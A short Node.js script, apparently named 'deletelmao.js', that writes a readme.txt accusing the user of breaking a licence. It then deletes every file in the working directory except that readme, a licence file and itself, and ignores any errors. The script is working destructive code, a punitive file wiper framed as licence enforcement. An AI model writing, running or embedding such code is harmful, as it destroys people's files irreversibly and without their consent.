const fs = require('fs');
fs.writeFileSync('./readme.txt', 'You broke the licence, please read LICENSE.txt', 'utf-8');
fs.readdirSync('./').forEach(file => {
    if (file === 'licence.txt' || file === 'readme.txt' || file === 'deletelmao.js') return;
    else fs.unlink(`./${file}`, f => { });
});
